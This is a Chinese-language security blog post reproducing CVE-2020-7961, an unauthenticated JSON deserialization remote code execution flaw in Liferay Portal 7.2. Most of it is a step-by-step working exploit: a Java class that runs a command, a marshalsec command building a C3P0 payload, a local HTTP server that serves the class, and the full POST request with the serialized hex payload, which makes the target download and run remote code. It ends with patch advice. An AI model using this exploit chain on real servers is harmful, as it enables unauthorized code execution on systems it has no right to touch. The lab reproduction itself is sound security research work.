## CVE-2020-7961 Liferay Portal 代码执行漏洞复现

原创 shadow1ng [雷神众测]

***声明***

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

***漏洞描述***

近日,Code White公开了在Liferay Portal中发现的JSON反序列化高危漏洞,未授权的攻击者可以通过精心构造的恶意数据对API接口发起远程代码执行的攻击.

Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。

***No.1***

***复现过程***

**一.环境搭建**

本次使用环境

windows 10

jdk-8u251

jre-8u251

下载tomcat集成包liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz

**二.配置环境**

设置jre路径,编辑

C:\Users\影舞者\Desktop\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin\setclasspath.bat

添加set JRE_HOME=C:\Program Files\Java\jre1.8.0_251

![img](Liferay Portal代码执行/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9IeE84Tm9yUDRKVkhMT1Njc3pNbWFVT2g1T3U4YkR2UHR5b0FrMmhFMGhqZGpzS1Y5bmw4ajJ0T245bmw5bUNZYWVNU3VZYlA1SHdCdkxCemRreVJ0Zy82NDA)

**三.开启环境**

```bash
cd C:\Users\影舞者\Desktop\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin.\catalina.bat run
1
```

![img](Liferay Portal代码执行/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9IeE84Tm9yUDRKVkhMT1Njc3pNbWFVT2g1T3U4YkR2UGszZzBjSW91aEtrbjdKaWFpYktRaWNkNDdKcFVmNWRKcXNYVG96aEVOcXpYQmtHNmc5Zjc4SmR1dy82NDA)

开启后，访问http://127.0.0.1:8080，点击默认配置即可

![img](Liferay Portal代码执行/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9IeE84Tm9yUDRKVkhMT1Njc3pNbWFVT2g1T3U4YkR2UGRGaWJieVhxNEtlaG1sd0s2WmliOWlhanJWNzNFaWNzaWJsUXVwY0JDR1gyYWw1WDh2QkFjSE03dWJ3LzY0MA)

**四. expoilt**

**1.编译LifExp.java →LifExp.class**

```sql
javac .\LifExp.java
1
```

LifExp.java

```java
public class LifExp { 
    static { 
        try { 
            String[] cmd = {"cmd.exe", "/c", "calc.exe"};
            java.lang.Runtime.getRuntime().
exec(cmd).waitFor(); 
        } catch ( Exception e ) { 
            e.printStackTrace(); 
        } 
    } 
}
1234567891011
```

**2.生成payload**

```sql
java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://192.168.207.1:9001/ LifExp
1
```

![img](Liferay Portal代码执行/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9IeE84Tm9yUDRKVkhMT1Njc3pNbWFVT2g1T3U4YkR2UGxqNlRNaWFUNVgwTG5UcUcza1Q1Tk9vcTRpYUdVeGxpYXp3OXdBY0R2cThnbHZFN0ZuaWFYS0NxVXcvNjQw)

**3.开启本地监听**

python3 -m http.server 9001

等待expoilt后，靶机来读取我们生成好的class文件

![img](Liferay Portal代码执行/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9IeE84Tm9yUDRKVkhMT1Njc3pNbWFVT2g1T3U4YkR2UHU2NVZlVEpzWWdnaWNkdG85TnFJMk5kUjRkVWtDQzZQbzhaaFdsZUFLOUlMbWRrZWNZcWhSVWcvNjQw)

**4.发送payload**

> POST /api/jsonws/invoke HTTP/1.1Host:  192.168.207.133:8080Content-Length: 1310Cache-Control:  max-age=0Upgrade-Insecure-Requests: 1Origin:  http://192.168.207.133:8080Content-Type:  application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/81.0.4044.122 Safari/537.36Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.207.133:8080/api/jsonws/invokeAccept-Encoding: gzip,  deflateAccept-Language: zh-CN,zh;q=0.9Cookie: COOKIE_SUPPORT=true;  GUEST_LANGUAGE_ID=zh_CN; JSESSIONID=87A005AED1F59A11F72BD5072F4CA2F3;  LFR_SESSION_STATE_20105=1587535682761Connection:  closecmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&tableId=1&name=2&type=3&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={“userOverridesAsString”:“HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e3230372e313a393030312f740003466f6f;”}

WrapperConnectionPoolDataSource= 后面的内容换成"2.生成payload 中对应的结果"

![img](Liferay Portal代码执行/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9IeE84Tm9yUDRKVkhMT1Njc3pNbWFVT2g1T3U4YkR2UEViZXZjZ2liYWlhaWNIYzdkNGhYWjRpYVVVVFFxcEdrQlBxZ3k2cXdNdDhjaFRHc1RwRWJOYXpId0EvNjQw)

成功弹窗~

**五、修复建议**

Liferay Portal 7.2： Liferay Portal 7.2.0没有可用的修补程序。而是，用户应升级到Liferay Portal 7.3.1 GA2或更高版本。

Liferay Portal 7.1：Liferay Portal 7.1 GA4（7.1.3）的源修补程序可在GitHub上获得。可以在Patching Liferay Portal页面上找到有关使用源补丁的详细信息。

Liferay Portal 7.0：Liferay Portal 7.0 GA7（7.0.6）的源修补程序可在GitHub上获得。可以在Patching Liferay Portal页面上找到有关使用源补丁的详细信息。

Liferay Portal 6.2：Liferay Portal 6.2 GA6（6.2.5）的源修补程序可在GitHub上获得。可以在Patching Liferay Portal页面上找到有关使用源补丁的详细信息。

转载自https://mp.weixin.qq.com/s/A1w03zOClJDG1fl-MBrm_g